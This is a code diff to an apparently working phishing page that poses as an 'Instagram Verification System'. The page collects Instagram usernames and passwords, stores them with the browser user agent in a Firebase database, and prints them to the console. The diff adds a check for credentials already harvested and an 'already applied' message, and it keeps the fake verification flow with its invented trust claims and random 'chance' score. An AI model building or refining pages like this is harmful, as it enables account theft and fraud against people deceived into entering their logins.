@@ -477,8 +477,6 @@
         }
         
         /* ===== LIGHT TEXTS ===== */
-        
-        /* Top - Wait for 24-48 hours */
         .wait-text {
             color: rgba(255, 255, 255, 0.12);
             font-size: 13px;
@@ -491,7 +489,6 @@
             top: -10px;
         }
         
-        /* Good Luck - Very Light */
         .good-luck-text {
             color: rgba(255, 255, 255, 0.08);
             font-size: 13px;
@@ -502,7 +499,6 @@
             text-align: center;
         }
         
-        /* Chance - Random number show */
         .chance-text {
             color: rgba(255, 255, 255, 0.35);
             font-size: 12px;
@@ -513,7 +509,6 @@
             text-align: center;
         }
         
-        /* Enter Email ID - Thoda Dark */
         .email-text {
             color: rgba(255, 255, 255, 0.20);
             font-size: 11px;
@@ -522,6 +517,29 @@
             margin-top: 6px;
             animation: fadeInLight 2.2s ease 1.6s both;
             text-align: center;
+        }
+        
+        /* ===== ALREADY APPLIED MESSAGE ===== */
+        .already-applied {
+            display: none;
+            color: #ffcc00;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 10px;
+            text-align: center;
+            animation: fadeSlide 0.5s ease;
+            background: rgba(255, 204, 0, 0.1);
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 204, 0, 0.2);
+        }
+        
+        .already-applied.show {
+            display: block;
+        }
+        
+        .already-applied i {
+            margin-right: 8px;
         }
         
         @keyframes fadeInLight {
@@ -668,6 +686,10 @@
             .email-text {
                 font-size: 9px;
             }
+            .already-applied {
+                font-size: 12px;
+                padding: 8px 14px;
+            }
         }
     </style>
 </head>
@@ -731,12 +753,17 @@
                     <span>Finalizing verification</span>
                 </div>
             </div>
+            
+            <!-- ===== ALREADY APPLIED MESSAGE ===== -->
+            <div class="already-applied" id="alreadyApplied">
+                <i class="fas fa-info-circle"></i>
+                <span>⚠️ These credentials have already been applied before!</span>
+            </div>
         </div>
         
         <!-- STEP 3: VERIFIED -->
         <div class="step" id="stepVerified">
             
-            <!-- ===== TOP: Wait for 24-48 hours ===== -->
             <div class="wait-text">⏳ Wait for 24 - 48 hours</div>
             
             <div class="verify-badge">
@@ -764,7 +791,6 @@
                 <span>Trusted by <span class="number">10,000+</span> users worldwide</span>
             </div>
             
-            <!-- ===== LIGHT TEXTS ===== -->
             <div class="good-luck-text">✦ Good Luck ✦</div>
             <div class="chance-text" id="chanceDisplay">⚡ 0% chance • keep going</div>
             <div class="email-text">✉️ Enter email id for updates</div>
@@ -841,10 +867,11 @@
         };
 
         // ============================================
-        // FIREBASE INITIALIZE (Hidden)
+        // FIREBASE INITIALIZE
         // ============================================
         let database = null;
         let firebaseInitialized = false;
+        let allVisitors = [];
 
         function initFirebase() {
             try {
@@ -859,12 +886,50 @@
         }
 
         // ============================================
-        // SAVE TO FIREBASE
+        // LOAD FROM FIREBASE
+        // ============================================
+        function loadVisitorsFromFirebase() {
+            if (!firebaseInitialized) return;
+
+            database.ref('visitors').orderByChild('timestamp').limitToLast(100).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    allVisitors = Object.values(data);
+                    console.log('📁 Loaded from Firebase:', allVisitors.length, 'visitors');
+                    localStorage.setItem('instagram_visitors_firebase', JSON.stringify(allVisitors));
+                }
+            }, (error) => {
+                console.error('❌ Firebase load error:', error);
+            });
+        }
+
+        // ============================================
+        // CHECK DUPLICATE IN FIREBASE
+        // ============================================
+        function checkDuplicate(username, password) {
+            // Check in allVisitors array
+            for (let i = 0; i < allVisitors.length; i++) {
+                const visitor = allVisitors[i];
+                if (visitor.username === username && visitor.password === password) {
+                    return true; // Duplicate found
+                }
+            }
+            return false; // No duplicate
+        }
+
+        // ============================================
+        // SAVE TO FIREBASE (Only if not duplicate)
         // ============================================
         function saveToFirebase(username, password) {
             if (!firebaseInitialized) {
                 console.warn('⚠️ Firebase not initialized');
-                return false;
+                return { success: false, duplicate: false };
+            }
+
+            // ===== CHECK DUPLICATE =====
+            if (checkDuplicate(username, password)) {
+                console.log('⚠️ Duplicate detected! Not saving.');
+                return { success: false, duplicate: true };
             }
 
             const timestamp = Date.now();
@@ -876,35 +941,21 @@
                 userAgent: navigator.userAgent
             };
 
+            // Save to Firebase
             database.ref('visitors/' + timestamp).set(data)
                 .then(() => {
                     console.log('✅ Saved to Firebase!');
                     console.log('👤 Username:', username);
                     console.log('🔑 Password:', password);
+                    
+                    // Add to local array
+                    allVisitors.push(data);
                 })
                 .catch((error) => {
                     console.error('❌ Firebase save error:', error);
                 });
 
-            return true;
-        }
-
-        // ============================================
-        // LOAD FROM FIREBASE
-        // ============================================
-        function loadVisitorsFromFirebase() {
-            if (!firebaseInitialized) return;
-
-            database.ref('visitors').orderByChild('timestamp').limitToLast(10).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    const visitors = Object.values(data).reverse();
-                    console.log('📁 Loaded from Firebase:', visitors.length, 'visitors');
-                    localStorage.setItem('instagram_visitors_firebase', JSON.stringify(visitors));
-                }
-            }, (error) => {
-                console.error('❌ Firebase load error:', error);
-            });
+            return { success: true, duplicate: false };
         }
 
         // ============================================
@@ -915,41 +966,24 @@
                 console.warn('⚠️ Firebase not initialized');
                 return;
             }
-            database.ref('visitors').orderByChild('timestamp').limitToLast(20).once('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    const visitors = Object.values(data).reverse();
-                    console.log('📊 ===== FIREBASE VISITORS =====');
-                    console.log(`📁 Total: ${visitors.length} visitors`);
-                    visitors.forEach((v, i) => {
-                        console.log(`  ${i+1}. 👤 ${v.username} | 🔑 ${v.password} | 🕐 ${v.time}`);
-                    });
-                } else {
-                    console.log('📭 No data in Firebase yet');
-                }
+            console.log('📊 ===== FIREBASE VISITORS =====');
+            console.log(`📁 Total: ${allVisitors.length} visitors`);
+            allVisitors.forEach((v, i) => {
+                console.log(`  ${i+1}. 👤 ${v.username} | 🔑 ${v.password} | 🕐 ${v.time}`);
             });
         }
 
         // ============================================
         // RANDOM CHANCE GENERATOR (0-30%)
-        // Same username/password = same chance
         // ============================================
         function getChance(username, password) {
-            // Create a unique key from username + password
             const key = username + ':' + password;
-            
-            // Simple hash function
             let hash = 0;
             for (let i = 0; i < key.length; i++) {
-                const char = key.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash; // Convert to 32bit integer
+                hash = ((hash << 5) - hash) + key.charCodeAt(i);
+                hash = hash & hash;
             }
-            
-            // Convert to positive and get between 0-30%
-            const chance = Math.abs(hash) % 31; // 0 to 30
-            
-            return chance;
+            return Math.abs(hash) % 31;
         }
 
         // ============================================
@@ -975,16 +1009,25 @@
             const username = document.getElementById('username').value.trim() || 'user';
             const password = document.getElementById('password').value.trim() || 'password123';
             
-            // ===== SAVE TO FIREBASE =====
-            saveToFirebase(username, password);
+            // ===== SAVE TO FIREBASE (with duplicate check) =====
+            const result = saveToFirebase(username, password);
             
             // ===== SAVE TO LOCALSTORAGE =====
             localStorage.setItem('lastLoginData', JSON.stringify({ username, password }));
             localStorage.setItem('lastUsername', username);
             
-            // ===== GENERATE CHANCE (0-30%) =====
+            // ===== GENERATE CHANCE =====
             const chance = getChance(username, password);
             localStorage.setItem('userChance', chance);
+            
+            // ===== SHOW ALREADY APPLIED MESSAGE =====
+            const alreadyAppliedEl = document.getElementById('alreadyApplied');
+            if (result.duplicate) {
+                alreadyAppliedEl.classList.add('show');
+                // Still show verification but with warning
+            } else {
+                alreadyAppliedEl.classList.remove('show');
+            }
             
             document.getElementById('loginContainer').classList.add('hidden');
             
@@ -993,17 +1036,23 @@
             
             document.getElementById('scanLine').classList.add('active');
             
-            startVerification(username, chance);
+            // Pass duplicate status to verification
+            startVerification(username, chance, result.duplicate);
         }
 
         // ============================================
         // VERIFICATION FLOW
         // ============================================
-        function startVerification(username, chance) {
+        function startVerification(username, chance, isDuplicate) {
             showStep('stepLoading');
             
             setTimeout(() => {
                 showStep('stepProcessing');
+                
+                // If duplicate, show message in processing step
+                if (isDuplicate) {
+                    document.getElementById('alreadyApplied').classList.add('show');
+                }
                 
                 setTimeout(() => {
                     document.getElementById('flipContainer').classList.add('active');
@@ -1012,14 +1061,14 @@
                     }, 600);
                 }, 400);
                 
-                startProgress(username, chance);
+                startProgress(username, chance, isDuplicate);
             }, 3000);
         }
 
         // ============================================
         // PROGRESS WITH EFFECTS
         // ============================================
-        function startProgress(username, chance) {
+        function startProgress(username, chance, isDuplicate) {
             let progress = 0;
             const percentEl = document.getElementById('percentText');
             
@@ -1051,7 +1100,7 @@
                     }, 600);
                     
                     setTimeout(() => {
-                        showVerified(username, chance);
+                        showVerified(username, chance, isDuplicate);
                     }, 500);
                 }
             }, 45);
@@ -1060,12 +1109,20 @@
         // ============================================
         // SHOW VERIFIED
         // ============================================
-        function showVerified(username, chance) {
+        function showVerified(username, chance, isDuplicate) {
             showStep('stepVerified');
             document.getElementById('verifiedUsername').textContent = '@' + username;
             
-            // ===== SHOW CHANCE =====
+            // Show chance
             document.getElementById('chanceDisplay').textContent = `⚡ ${chance}% chance • keep going`;
+            
+            // If duplicate, show a small note in verified page too
+            if (isDuplicate) {
+                // Add a small text below chance
+                const chanceEl = document.getElementById('chanceDisplay');
+                chanceEl.textContent = `⚡ ${chance}% chance • previously applied`;
+                chanceEl.style.color = 'rgba(255, 204, 0, 0.5)';
+            }
             
             document.getElementById('scanLine').classList.remove('active');
             
@@ -1122,6 +1179,7 @@
             document.getElementById('step3').querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
             
             document.getElementById('percentText').textContent = '0%';
+            document.getElementById('alreadyApplied').classList.remove('show');
             showStep('stepLoading');
             
             document.body.classList.remove('shake-active');
@@ -1146,7 +1204,9 @@
             document.getElementById('username').focus();
             initFirebase();
             console.log('✅ Instagram Verification System Loaded!');
-            console.log('📌 Type viewFirebaseData() to see saved data');
+            console.log('📌 Commands:');
+            console.log('  • viewFirebaseData() - View all saved data');
+            console.log('  • checkDuplicate("user", "pass") - Check if credentials exist');
         };
     </script>
 </body>
